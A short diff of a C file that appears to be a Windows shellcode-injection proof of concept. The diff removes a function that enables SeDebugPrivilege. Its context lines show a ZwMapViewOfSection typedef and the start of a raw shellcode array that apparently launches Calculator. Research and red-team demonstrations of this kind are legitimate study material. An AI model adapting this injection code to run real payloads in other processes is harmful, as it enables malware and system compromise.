@@ -13,24 +13,6 @@ typedef NTSTATUS(NTAPI* p_ZwMapViewOfSection)(
 	ULONG AllocationType,
 	ULONG Win32Protect
 	);
-void EnableDebugPriv()
-{
-	HANDLE hToken;
-	LUID luid;
-	TOKEN_PRIVILEGES tkp;
-
-	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
-
-	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
-
-	tkp.PrivilegeCount = 1;
-	tkp.Privileges[0].Luid = luid;
-	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);
-
-	CloseHandle(hToken);
-}
 int main() {
 	unsigned char code[] =
 	{ 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B,
